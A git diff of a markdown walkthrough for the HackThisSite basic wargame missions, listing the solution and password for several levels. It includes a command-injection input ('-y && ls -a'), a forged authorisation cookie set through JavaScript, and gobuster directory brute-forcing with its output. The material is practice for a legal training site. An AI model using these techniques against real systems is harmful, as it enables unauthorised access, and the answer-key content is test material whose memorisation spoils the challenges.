@@ -17,13 +17,15 @@ no password required
 ```
 
 ## BASIC 3
-"password.php" was attached to submission
+- "password.php" WAS ATTACHED TO SUBMISSION
+- OPEN TO FIND CREDENTIALS
 ```
 137e9d2e
 ```
+
 ## BASIC 4
-- sam@hackthissite.org
-REPLACE EMAIL WITH YOUR ACCOUNT EMAIL
+- SAMS EMAIL "sam@hackthissite.org"
+- REPLACE EMAIL WITH YOUR ACCOUNT EMAIL
 ```
 Sam,
 Here is the password: 'cb221771'
@@ -37,16 +39,16 @@ Here is the password: 'a233109a'
 ```
 
 ## BASIC 6
-ENCRPYTED PASSWORD - 0d574;h8
-ENCRPYTED VIA UNICODE
-USE "basic6.py"
+- ENCRPYTED PASSWORD - 0d574;h8
+  - ENCRPYTED VIA UNICODE
+- USE "basic6.py"
 ```
 0c3406b1
 ```
 
 ## BASIC 7
 ENTER: "-y && ls -a"
-OPEN k1kh31b1n55h.php
+> OPEN k1kh31b1n55h.php
 ```
 02bdd732
 ```
@@ -72,30 +74,44 @@ a1bce470
 ```
 
 ## BASIC 10
-SET COOKIE WITH JS
+SET COOKIE WITH JS CONSOLE
 ```javascript
 document.cookie = "level10_authorized=yes"
 ```
+THEN ENTER ANY PASSWORD
 
 ## BASIC 11
 - ALL SONGS BY ELTON JOHN
 
-RAN: "gobuster dir -u 'https://www.hackthissite.org/missions/basic/11' -w base11-wordlist.txt -v -o dirbuster.txt"
-OUTPUT:
+RAN: 
+```bash
+gobuster dir -u 'https://www.hackthissite.org/missions/basic/11' -w base11-wordlist.txt -v -o dirbuster.txt
+```
+OPEN "dirbuster.txt":
 ```bash
 Found: /e (Status: 301)
+Found: /index.php (Status: 200)
 ```
-NEW PATH: https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/
-RAN: "gobuster dir -u 'https://www.hackthissite.org/missions/basic/11/e/l/t/o/n' -w /usr/share/wordlists/dirb/common.txt -v -o dirbuster-common.txt"
+
+> NEW PATH: https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/
+
+RAN: 
+```bash
+gobuster dir -u 'https://www.hackthissite.org/missions/basic/11/e/l/t/o/n' -w /usr/share/wordlists/dirb/common.txt -v -o dirbuster-common.txt
+```
+OPEN "dirbuster-common.txt":
 ```bash
 Found: /.htaccess (Status: 200)
 ```
-HTACCESS FILE LED TO "DaAnswer" FILE
+
+> HTACCESS FILE LED TO "DaAnswer" FILE [https://www.hackthissite.org/missions/basic/11/e/l/t/o/n/DaAnswer]
+
 DaAnswer:
 ```
 The answer is **short**! Just look a little harder.
 ```
 NAVIGATE TO: https://www.hackthissite.org/missions/basic/11/index.php
+- "index.php" DISCOVERED IN "dirbuster.txt"
 ```
 short
 ```
